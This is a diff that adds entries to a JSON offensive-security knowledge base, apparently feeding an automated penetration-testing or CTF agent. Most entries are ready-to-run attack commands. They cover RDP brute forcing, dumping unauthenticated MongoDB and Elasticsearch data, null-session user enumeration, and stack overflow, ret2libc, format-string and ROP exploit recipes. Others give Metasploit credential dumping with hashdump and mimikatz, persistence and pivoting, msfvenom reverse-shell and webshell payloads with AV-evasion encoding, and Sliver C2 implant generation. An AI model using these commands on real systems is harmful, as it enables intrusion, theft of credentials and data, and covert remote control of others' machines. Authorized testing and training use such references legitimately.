+    "id": "network-services-rdp-enum",
+    "content": "RDP service enumeration (port 3389)\nCheck if open and get info: nmap -p 3389 --script rdp-enum-encryption,rdp-vuln-ms12-020 <target>\nNLA check: nmap -p 3389 --script rdp-enum-encryption <target>\n  NLA not required = credential prompt without NLA (older, weaker)\nCVE-2019-0708 BlueKeep check: msfconsole -q -x 'use auxiliary/scanner/rdp/cve_2019_0708_bluekeep; set RHOSTS <target>; run; exit'\nCVE-2012-0002 MS12-020 check: nmap -p 3389 --script rdp-vuln-ms12-020 <target>\nBrute force: crowbar -b rdp -s <target>/32 -u admin -C /usr/share/wordlists/rockyou.txt\nConnect: xfreerdp /u:<user> /p:<pass> /v:<target> /cert-ignore",
+    "metadata": {
+      "category": "network-services",
+      "technique": "rdp",
+      "tool": "nmap"
+    }
+  },
+  {
+    "id": "network-services-mongodb",
+    "content": "MongoDB unauthenticated access (default port 27017)\nCheck for no-auth: mongo --host <target> --port 27017 --eval 'db.adminCommand({listDatabases:1})'\nOr with mongosh: mongosh --host <target>:27017 --eval 'show dbs'\nList collections: db.getCollectionNames()\nDump collection: db.<collection>.find().limit(10)\nnmap script: nmap -p 27017 --script mongodb-info,mongodb-databases <target>\nNo authentication = critical severity \u2014 store as vulnerability\nExtract all data: mongoexport --host <target> --db <db> --collection <col> --out /work/mongo_dump.json\nCheck for credentials in admin and config databases",
+    "metadata": {
+      "category": "network-services",
+      "technique": "mongodb",
+      "tool": "mongo"
+    }
+  },
+  {
+    "id": "network-services-elasticsearch",
+    "content": "Elasticsearch unauthenticated access (default port 9200)\nCheck cluster info: curl -s http://<target>:9200/\nList indices: curl -s http://<target>:9200/_cat/indices?v\nDump index: curl -s 'http://<target>:9200/<index_name>/_search?size=100'\nCheck all data: curl -s 'http://<target>:9200/_search?size=10'\nGet cluster health: curl -s http://<target>:9200/_cluster/health\nKibana UI: check port 5601 for unauthenticated Kibana dashboard\nNo authentication = critical severity \u2014 all indexed data is accessible\nRCE via dynamic scripting (older versions): see elasticsearch-rce-dynamic-scripting in KB",
+    "metadata": {
+      "category": "network-services",
+      "technique": "elasticsearch",
+      "tool": "curl"
+    }
+  },
+  {
+    "id": "network-services-rpcclient",
+    "content": "Windows RPC enumeration via rpcclient (null session)\nConnect: rpcclient -U '' -N <target>\nEnumerate users: enumdomusers\nEnumerate groups: enumdomgroups\nGet user info: queryuser <rid>\nEnumerate domains: enumdomains\nGet domain password policy: getdompwinfo\nSID lookup: lookupnames <username>\nNull session gives user list = store as vulnerability severity=medium\nUse RID cycling to enumerate all accounts:\n  for i in $(seq 500 1200); do rpcclient -U '' -N <target> -c \"queryuser $i\" 2>/dev/null | grep 'User Name'; done",
+    "metadata": {
+      "category": "network-services",
+      "technique": "rpc-enum",
+      "tool": "rpcclient"
+    }
+  },
+  {
+    "id": "binary-exploit-checksec",
+    "content": "Binary security analysis before exploitation\nchecksec: checksec --file=<binary>\nKey protections and implications:\n  NX/DEP enabled: can't execute shellcode on stack \u2192 use ROP chains\n  PIE enabled: base address randomized \u2192 need leak to calculate offsets\n  Stack Canary: stack overflow will be caught \u2192 need canary leak or format string\n  RELRO Full: GOT read-only \u2192 can't overwrite GOT entries\n  ASLR (OS-level): randomizes stack/heap/lib addresses \u2192 need leak\nCheck with pwntools: python3 -c 'from pwn import *; e=ELF(\"<binary>\"); print(e.checksec())'\nfile <binary> \u2014 check: 32 vs 64 bit, stripped vs not, dynamically vs statically linked\nstrings <binary> | grep -iE 'flag|passwd|win|system' \u2014 quick win check",
+    "metadata": {
+      "category": "binary-exploitation",
+      "technique": "binary-analysis",
+      "tool": "checksec"
+    }
+  },
+  {
+    "id": "binary-exploit-stack-overflow",
+    "content": "Stack buffer overflow exploitation\n1. Find offset to EIP/RIP:\n  python3 -c 'from pwn import *; print(cyclic(200))' | ./binary\n  In GDB: cyclic_find(0x<eip_value>)\n  Or: python3 -c 'print(\"A\"*<offset> + \"B\"*4)' | ./binary\n2. Find bad characters (skip \\x00 by default)\n3. Find return address (JMP ESP for shellcode, or gadget for ROP)\n4a. If NX disabled (execute stack): place shellcode after offset\n  payload = b'A'*offset + p32(jmp_esp_addr) + shellcode\n4b. If NX enabled: use ret2libc or ROP chain\nGDB commands: r < input, info registers, x/32wx $esp, disas main\npwntools skeleton: from pwn import *; p = process('./binary')",
+    "metadata": {
+      "category": "binary-exploitation",
+      "technique": "stack-overflow",
+      "tool": "pwntools"
+    }
+  },
+  {
+    "id": "binary-exploit-ret2libc",
+    "content": "ret2libc attack \u2014 call system('/bin/sh') without shellcode\nRequires: no PIE or a libc leak\n1. Find libc base:\n  ldd ./binary | grep libc  \u2192 shows libc path\n  In GDB: p system, p exit \u2014 gives absolute addresses if no ASLR\n2. Find offsets in libc:\n  python3 -c 'from pwn import *; l=ELF(\"/lib/x86_64-linux-gnu/libc.so.6\"); print(hex(l.sym[\"system\"]))'\n3. Find /bin/sh string in libc:\n  strings -a -t x /lib/x86_64-linux-gnu/libc.so.6 | grep '/bin/sh'\n4. Build payload (32-bit): b'A'*offset + p32(system) + p32(exit) + p32(binsh)\n5. 64-bit: need ROP gadget to put /bin/sh addr in RDI first\n  ROPgadget --binary ./binary | grep 'pop rdi'",
+    "metadata": {
+      "category": "binary-exploitation",
+      "technique": "ret2libc",
+      "tool": "pwntools"
+    }
+  },
+  {
+    "id": "binary-exploit-format-string",
+    "content": "Format string vulnerability exploitation\nDetection: pass '%p %p %p %p' or '%x %x' as input \u2014 if addresses printed, vulnerable\n  echo '%p.%p.%p.%p' | ./binary\nFind offset (position of your input on stack):\n  echo 'AAAA.%p.%p.%p.%p.%p.%p.%p.%p' | ./binary \u2014 find where 41414141 appears\nLeak a specific stack value: %<N>$p (where N = stack offset)\nLeak canary (usually 7th or 8th): %7$p\nArbitrary read: provide address + %<N>$s to read string at that address\nArbitrary write: %<N>$n writes number of chars printed to address N points to\nPwntools format string helper: fmtstr_payload(offset, {target_addr: value})",
+    "metadata": {
+      "category": "binary-exploitation",
+      "technique": "format-string",
+      "tool": "pwntools"
+    }
+  },
+  {
+    "id": "binary-exploit-rop-chain",
+    "content": "ROP (Return-Oriented Programming) chain construction\nFind gadgets: ROPgadget --binary ./binary --rop\n  ROPgadget --binary ./binary | grep 'pop rdi'\n  ROPgadget --binary /lib/x86_64-linux-gnu/libc.so.6 | grep 'ret'\nCommon 64-bit ROP to call system('/bin/sh'):\n  pop_rdi = 0x<addr>  # gadget: pop rdi; ret\n  ret_gadget = 0x<addr>  # for stack alignment (needed before system())\n  payload = b'A'*offset + p64(pop_rdi) + p64(binsh_addr) + p64(ret_gadget) + p64(system_addr)\npwntools ROP builder:\n  rop = ROP(elf)\n  rop.call(elf.plt['system'], [next(elf.search(b'/bin/sh'))])\n  payload = b'A'*offset + bytes(rop)",
+    "metadata": {
+      "category": "binary-exploitation",
+      "technique": "rop",
+      "tool": "ROPgadget"
+    }
+  },
+  {
+    "id": "binary-exploit-pwntools-template",
+    "content": "pwntools exploit script template\nfrom pwn import *\ncontext.binary = elf = ELF('./binary')\ncontext.log_level = 'info'  # or 'debug' for verbose\n\n# Local process\np = process('./binary')\n# Remote\n# p = remote('<host>', <port>)\n\n# Send/receive\np.recvuntil(b'prompt:')\np.sendline(b'payload')\np.sendlineafter(b'prompt:', b'payload')\nleak = p.recvline()\naddr = u64(p.recv(8))\n\n# GDB attach for debugging\n# gdb.attach(p, gdbscript='break main\\ncontinue')\n\np.interactive()  # get interactive shell\nGDB with pwndbg: gdb ./binary \u2192 run \u2192 cyclic 200 \u2192 check eip/rip",
+    "metadata": {
+      "category": "binary-exploitation",
+      "technique": "pwntools",
+      "tool": "pwntools"
+    }
+  },
+  {
+    "id": "binary-exploit-gdb-commands",
+    "content": "GDB/pwndbg essential commands for exploit development\nRun: gdb ./binary\n  run < <(python3 -c 'print(\"A\"*200)')  \u2014 run with input\n  run <<< $(python3 -c 'print(\"A\"*200)')  \u2014 alternative\nAfter crash:\n  info registers  \u2014 see all register values\n  x/32wx $rsp  \u2014 examine stack (32 words from RSP)\n  x/s $rdi  \u2014 show string at RDI address\n  disas main  \u2014 disassemble function\npwndbg extras:\n  checksec  \u2014 show protections\n  cyclic 200  \u2014 generate de Bruijn sequence\n  cyclic -l 0x<value>  \u2014 find offset from EIP value\n  vmmap  \u2014 show memory mappings\n  search -x '/bin/sh'  \u2014 find string in memory\nBreakpoints: b *<address>, b main, b *main+<offset>",
+    "metadata": {
+      "category": "binary-exploitation",
+      "technique": "gdb",
+      "tool": "gdb"
+    }
+  },
+  {
+    "id": "c2-msf-module-search",
+    "content": "Metasploit framework \u2014 module search and selection\nLaunch: msfconsole -q\nSearch modules:\n  search <service>  \u2014 search by keyword\n  search type:exploit platform:windows <keyword>\n  search cve:<year>-<id>\n  search name:<module_name>\nUse a module: use <full_module_path> or use <number from search results>\nShow module info: info (after using)\nShow required options: show options\nSet options: set RHOSTS <target>; set RPORT <port>; set LHOST <your_ip>\nCheck targets: show targets; set TARGET <n>\nCheck payloads: show payloads\nSet payload: set PAYLOAD windows/x64/meterpreter/reverse_tcp\nRun: run (or exploit)\nNon-interactive one-liner: see network-msfconsole-module-exec",
+    "metadata": {
+      "category": "c2-frameworks",
+      "technique": "metasploit",
+      "tool": "msfconsole"
+    }
+  },
+  {
+    "id": "c2-msf-session-management",
+    "content": "Metasploit session management\nList active sessions: sessions -l\nInteract with session: sessions -i <id>\nBackground current session: background (or Ctrl+Z)\nKill session: sessions -k <id>\nUpgrade shell to meterpreter: sessions -u <id>\nRun command on all sessions: sessions -C 'whoami'\nRoute traffic through session (pivoting):\n  route add <subnet> <session_id>\n  route print\nSOCKS proxy through session:\n  use auxiliary/server/socks_proxy; set SRVPORT 1080; set VERSION 5; run\n  Then: proxychains <command>",
+    "metadata": {
+      "category": "c2-frameworks",
+      "technique": "metasploit-sessions",
+      "tool": "msfconsole"
+    }
+  },
+  {
+    "id": "c2-meterpreter-commands",
+    "content": "Meterpreter essential commands (inside active session)\nSystem info: sysinfo; getuid; getpid\nShell: shell  (drops to OS shell; exit to return)\nFile operations:\n  upload /local/file C:\\remote\\path\n  download C:\\remote\\file /local/path\n  ls, cat, cd, pwd, search -f flag.txt\nPrivilege escalation:\n  getsystem  (attempts common privesc techniques)\n  getprivs  (show current privileges)\nPersistence: run persistence -h  (shows options)\nCredential dumping:\n  run post/windows/gather/hashdump\n  load kiwi; creds_all  (mimikatz integration)\nPivoting: portfwd add -l 3389 -p 3389 -r <internal_host>\nScreenshot: screenshot\nProcess migration: migrate <pid>  (move to more stable process)",
+    "metadata": {
+      "category": "c2-frameworks",
+      "technique": "meterpreter",
+      "tool": "msfconsole"
+    }
+  },
+  {
+    "id": "c2-msf-post-modules",
+    "content": "Metasploit post-exploitation modules (run from meterpreter or via sessions)\nLocal exploit suggester:\n  run post/multi/recon/local_exploit_suggester\n  background first, then: use post/multi/recon/local_exploit_suggester; set SESSION <id>; run\nCredential gathering:\n  run post/windows/gather/hashdump  \u2014 NTLM hashes from SAM\n  run post/windows/gather/credentials/credential_collector\n  run post/linux/gather/hashdump\nEnumeration:\n  run post/windows/gather/enum_applications\n  run post/windows/gather/enum_shares\n  run post/multi/gather/env\nLateral movement:\n  run post/windows/manage/enable_rdp  \u2014 enable RDP on target\n  run post/multi/manage/shell_to_meterpreter",
+    "metadata": {
+      "category": "c2-frameworks",
+      "technique": "msf-post",
+      "tool": "msfconsole"
+    }
+  },
+  {
+    "id": "c2-msf-handler-setup",
+    "content": "Metasploit multi/handler \u2014 listener for reverse shells and staged payloads\nSetup:\n  use exploit/multi/handler\n  set PAYLOAD <same_payload_as_used_in_stager>\n  set LHOST <your_ip>  # use tun0 for VPN, eth0 for local lab\n  set LPORT 4444\n  set ExitOnSession false  # keep handler alive for multiple sessions\n  run -j  # run as background job\nOne-liner: msfconsole -q -x 'use exploit/multi/handler; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST <ip>; set LPORT 4444; set ExitOnSession false; run -j'\nCheck your VPN IP: ip addr show tun0 | grep 'inet '\nCommon payloads:\n  windows/x64/meterpreter/reverse_tcp  (staged, needs handler)\n  windows/x64/meterpreter_reverse_tcp  (stageless, self-contained)\n  linux/x64/meterpreter/reverse_tcp",
+    "metadata": {
+      "category": "c2-frameworks",
+      "technique": "msf-handler",
+      "tool": "msfconsole"
+    }
+  },
+  {
+    "id": "c2-msf-auxiliary-scanners",
+    "content": "Metasploit auxiliary scanner modules for service enumeration\nPort scan: use auxiliary/scanner/portscan/tcp; set RHOSTS <cidr>; set PORTS 1-1000; run\nSMB version: use auxiliary/scanner/smb/smb_version; set RHOSTS <target>; run\nSSH version: use auxiliary/scanner/ssh/ssh_version; set RHOSTS <target>; run\nFTP anon: use auxiliary/scanner/ftp/anonymous; set RHOSTS <target>; run\nHTTP headers: use auxiliary/scanner/http/http_header; set RHOSTS <target>; run\nSNMP: use auxiliary/scanner/snmp/snmp_enumusers; set RHOSTS <target>; run\nRDP: use auxiliary/scanner/rdp/rdp_scanner; set RHOSTS <target>; run\nCredential spray SMB: use auxiliary/scanner/smb/smb_login; set RHOSTS <target>;\n  set USER_FILE users.txt; set PASS_FILE pass.txt; run",
+    "metadata": {
+      "category": "c2-frameworks",
+      "technique": "msf-auxiliary",
+      "tool": "msfconsole"
+    }
+  },
+  {
+    "id": "c2-sliver-basics",
+    "content": "Sliver C2 framework basics (open-source Cobalt Strike alternative)\nStart server: sliver-server\nStart client: sliver\nGenerate implant:\n  generate --mtls <server_ip>:443 --os windows --arch amd64 --save /tmp/beacon.exe\n  generate --http <server_ip> --os linux --arch amd64 --save /tmp/beacon\nStart listener:\n  mtls --lport 443  (mutual TLS, most evasive)\n  http --lport 80\n  https --lport 443\nAfter callback:\n  sessions  \u2014 list active sessions\n  use <session_id>  \u2014 interact\nIn session: ls, cat, upload, download, execute, shell, ps, netstat\nPivoting: socks5 start --host 127.0.0.1 --port 1080",
+    "metadata": {
+      "category": "c2-frameworks",
+      "technique": "sliver",
+      "tool": "sliver"
+    }
+  },
+  {
+    "id": "c2-msf-msfvenom-payloads",
+    "content": "msfvenom payload generation reference\nWindows x64 reverse TCP (EXE):\n  msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<ip> LPORT=4444 -f exe -o shell.exe\nWindows x64 stageless (no handler needed for shell, but no meterpreter features):\n  msfvenom -p windows/x64/shell_reverse_tcp LHOST=<ip> LPORT=4444 -f exe -o shell.exe\nLinux ELF:\n  msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=<ip> LPORT=4444 -f elf -o shell\nPHP webshell:\n  msfvenom -p php/meterpreter/reverse_tcp LHOST=<ip> LPORT=4444 -f raw -o shell.php\nPython:\n  msfvenom -p python/meterpreter/reverse_tcp LHOST=<ip> LPORT=4444 -f raw\nList payloads: msfvenom -l payloads | grep '<os>'\nEncode to evade AV: msfvenom ... -e x86/shikata_ga_nai -i 3",
+    "metadata": {
+      "category": "c2-frameworks",
+      "technique": "msfvenom",
+      "tool": "msfvenom"
+    }
+  },
+  {
+    "id": "web-http-method-testing",
+    "content": "HTTP method testing and verb tampering\n405 Method Not Allowed: the server explicitly signals the method is wrong \u2014 retry with POST, PUT, DELETE, PATCH before marking the endpoint inaccessible.\nCheck allowed methods first: curl -X OPTIONS http://<host>/<path> -i \u2014 look for Allow: header.\nVerb tampering: endpoints returning 403 on GET sometimes accept POST or PUT \u2014 always worth a retry.\ncurl examples:\n  POST: curl -X POST http://<host>/<path> -d \"\" -i\n  PUT: curl -X PUT http://<host>/<path> -d \"\" -i\n  DELETE: curl -X DELETE http://<host>/<path> -i\nMultipart upload: curl -X POST http://<host>/<path> -F \"file=@/dev/null\" -i\nREST APIs: test all CRUD methods on any discovered resource endpoint (/api/users, /api/items, etc.).",
+    "metadata": {
+      "category": "web",
+      "technique": "method-testing",
+      "tool": "curl"
+    }
   }
 ]
